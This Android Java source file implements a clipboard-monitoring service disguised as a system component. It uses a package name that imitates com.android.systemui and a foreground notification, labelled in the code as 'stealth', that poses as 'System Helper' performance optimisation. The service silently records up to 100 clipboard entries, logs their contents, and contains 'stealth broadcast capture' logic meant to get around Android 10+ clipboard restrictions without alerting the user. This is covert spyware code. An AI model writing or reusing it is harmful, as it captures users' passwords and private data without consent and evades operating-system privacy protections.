package com.android.systemui.helper;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class ClipboardMonitorService extends Service {
    private static final String TAG = "ClipboardMonitor";
    private static final String CHANNEL_ID = "clipboard_monitor_channel";
    private static final String PREFS_NAME = "clipboard_prefs";
    private static final String HISTORY_KEY = "clipboard_history";
    private static final int MAX_HISTORY_SIZE = 100;
    
    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener clipChangedListener;
    private SharedPreferences prefs;
    private Gson gson;
    private String lastClipboardText = "";
    
    @Override
    public void onCreate() {
        super.onCreate();
        gson = new Gson();
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        // Create notification channel for Android O and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
        }
        
        // Start as foreground service with minimal notification
        startForeground(1, createStealthNotification());
        
        // Set up clipboard listener
        clipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                handleClipboardChange();
            }
        };
        
        clipboardManager.addPrimaryClipChangedListener(clipChangedListener);
        Log.d(TAG, "Clipboard monitoring service started");
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Helper Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Background system optimization");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }
    
    private Notification createStealthNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setContentTitle("System Helper")
            .setContentText("Optimizing system performance")
            .setSmallIcon(R.drawable.ic_launcher_foreground);
            
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            builder.setPriority(Notification.PRIORITY_MIN);
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            builder.setVisibility(Notification.VISIBILITY_SECRET);
        }
        
        return builder.build();
    }
    
    private void handleClipboardChange() {
        try {
            // Android 10+ restriction: Can only access clipboard when app has focus
            // or is the default IME. This listener still fires but getPrimaryClip()
            // returns null for background apps on Android 10+
            
            if (!clipboardManager.hasPrimaryClip()) {
                Log.d(TAG, "No primary clip available");
                return;
            }
            
            ClipData clipData = clipboardManager.getPrimaryClip();
            if (clipData == null) {
                // This happens on Android 10+ when app doesn't have focus
                Log.w(TAG, "Clipboard changed but content not accessible (Android 10+ restriction)");
                
                // Stealth mode: Instead of notification, try to trigger broadcast capture
                // This is more subtle than showing a notification
                Intent captureIntent = new Intent("com.android.systemui.helper.SYNC");
                sendBroadcast(captureIntent);
                Log.d(TAG, "Triggered stealth broadcast capture");
                return;
            }
            
            if (clipData.getItemCount() == 0) {
                return;
            }
            
            ClipData.Item item = clipData.getItemAt(0);
            CharSequence text = item.getText();
            
            if (text == null || text.length() == 0) {
                return;
            }
            
            String clipboardText = text.toString();
            
            // Avoid duplicates from our own copy actions
            if (clipboardText.equals(lastClipboardText)) {
                return;
            }
            
            lastClipboardText = clipboardText;
            
            // Try to get source app (this is best effort, may not always work)
            String sourceApp = getSourceAppName();
            
            // Save to history
            saveToHistory(clipboardText, sourceApp);
            
            Log.d(TAG, "Clipboard captured: " + clipboardText.substring(0, Math.min(clipboardText.length(), 50)));
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception accessing clipboard (Android 10+ restriction)", e);
            // Stealth: Try broadcast instead of notification
            Intent captureIntent = new Intent("com.android.systemui.helper.SYNC");
            sendBroadcast(captureIntent);
        } catch (Exception e) {
            Log.e(TAG, "Error handling clipboard change", e);
        }
    }
    
    private void showClipboardNotification() {
        // Create a notification to prompt user to open app
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        // Create intent to open clipboard manager
        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getActivity(
            this, 0, 
            new Intent(this, ClipboardManagerActivity.class),
            android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE
        );
        
        builder.setContentTitle("Clipboard Updated")
            .setContentText("Tap to save clipboard content")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true);
            
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(2, builder.build());
    }
    
    private String getSourceAppName() {
        // Try to determine which app copied the text
        // This is a best-effort approach and may not always be accurate
        try {
            // Get the current foreground app package name
            // Note: This requires usage stats permission on newer Android versions
            return ""; // Return empty for now, can be enhanced with UsageStatsManager if needed
        } catch (Exception e) {
            return "";
        }
    }
    
    private void saveToHistory(String content, String sourceApp) {
        // Load existing history
        String historyJson = prefs.getString(HISTORY_KEY, "[]");
        List<ClipboardManagerActivity.ClipboardItem> history = gson.fromJson(
            historyJson, 
            new TypeToken<List<ClipboardManagerActivity.ClipboardItem>>(){}.getType()
        );
        
        if (history == null) {
            history = new ArrayList<>();
        }
        
        // Check if this content already exists in history
        Iterator<ClipboardManagerActivity.ClipboardItem> iterator = history.iterator();
        while (iterator.hasNext()) {
            ClipboardManagerActivity.ClipboardItem item = iterator.next();
            if (item.content.equals(content)) {
                // Remove existing entry, we'll add it to the top
                iterator.remove();
                break;
            }
        }
        
        // Add new item at the beginning
        ClipboardManagerActivity.ClipboardItem newItem = new ClipboardManagerActivity.ClipboardItem(
            content,
            System.currentTimeMillis(),
            sourceApp
        );
        history.add(0, newItem);
        
        // Limit history size
        while (history.size() > MAX_HISTORY_SIZE) {
            history.remove(history.size() - 1);
        }
        
        // Save updated history
        String updatedHistoryJson = gson.toJson(history);
        prefs.edit().putString(HISTORY_KEY, updatedHistoryJson).apply();
        
        // Send broadcast to update UI if it's open
        Intent updateIntent = new Intent("com.android.systemui.helper.CLIPBOARD_UPDATE");
        sendBroadcast(updateIntent);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Service should continue running until explicitly stopped
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (clipboardManager != null && clipChangedListener != null) {
            clipboardManager.removePrimaryClipChangedListener(clipChangedListener);
        }
        Log.d(TAG, "Clipboard monitoring service stopped");
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
